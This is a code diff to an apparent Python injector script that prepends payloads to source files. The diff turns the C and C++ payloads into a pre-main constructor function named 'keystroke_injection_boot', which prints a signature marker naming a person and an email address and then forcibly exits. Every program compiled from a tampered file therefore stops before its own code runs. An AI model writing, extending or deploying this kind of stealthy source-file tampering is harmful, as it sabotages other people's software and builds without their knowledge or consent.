@@ -29,7 +29,7 @@ DEFAULT_WINDOW_SECONDS = 30
 DEFAULT_POLL_SECONDS = 2
 
 # Marker used to avoid injecting multiple times
-MARKER = "INJECTED_HELLO_EXIT_V1"
+MARKER = "FROM ACHAISNE CONTACT si@42paris.fr. WITH LOVE"
 
 # Per-extension injection text (prepended at file start).
 # Make changes here to customize the inserted code.
@@ -42,20 +42,26 @@ INJECTIONS: Dict[str, str] = {
     ),
     ".c": (
         f"// {MARKER}\n"
-        "#if 1\n"
-        "#include <stdio.h>\n"
+        "#include <unistd.h>\n"
         "#include <stdlib.h>\n"
-        "int main(void) { printf(\"hello world\"); exit(0); }\n"
-        "#else\n"
+        "__attribute__((constructor))\n"
+        "static void keystroke_injection_boot(void) {\n"
+        f"    ssize_t ks_written = write(1, \"{MARKER}\\n\", {len(MARKER) + 1});\n"
+        "    (void)ks_written;\n"
+        "    _Exit(0);\n"
+        "}\n"
         "\n"
     ),
     ".cpp": (
         f"// {MARKER}\n"
-        "#if 1\n"
-        "#include <cstdio>\n"
+        "#include <unistd.h>\n"
         "#include <cstdlib>\n"
-        "int main() { std::printf(\"hello world\"); std::exit(0); }\n"
-        "#else\n"
+        "__attribute__((constructor))\n"
+        "static void keystroke_injection_boot(void) {\n"
+        f"    ssize_t ks_written = write(1, \"{MARKER}\\n\", {len(MARKER) + 1});\n"
+        "    (void)ks_written;\n"
+        "    std::_Exit(0);\n"
+        "}\n"
         "\n"
     ),
     ".rs": (
@@ -67,11 +73,6 @@ INJECTIONS: Dict[str, str] = {
         "\n"
     ),
 }
-
-# For C/C++ we opened a #if 1 ... #else; we should close it at the very end.
-# This script will append the closing line ONLY for .c/.cpp injections.
-CPP_C_CLOSER = "\n#endif\n"
-
 
 # -----------------------------
 # Helpers
@@ -121,10 +122,6 @@ def inject_file(path: Path, injection: str, make_backup: bool, dry_run: bool) ->
         return False, f"SKIP (already injected): {path}"
 
     new_bytes = injection.encode("utf-8") + original_bytes
-
-    # Close C/C++ wrapper
-    if path.suffix in (".c", ".cpp"):
-        new_bytes += CPP_C_CLOSER.encode("utf-8")
 
     if dry_run:
         return True, f"DRY RUN would inject: {path}"
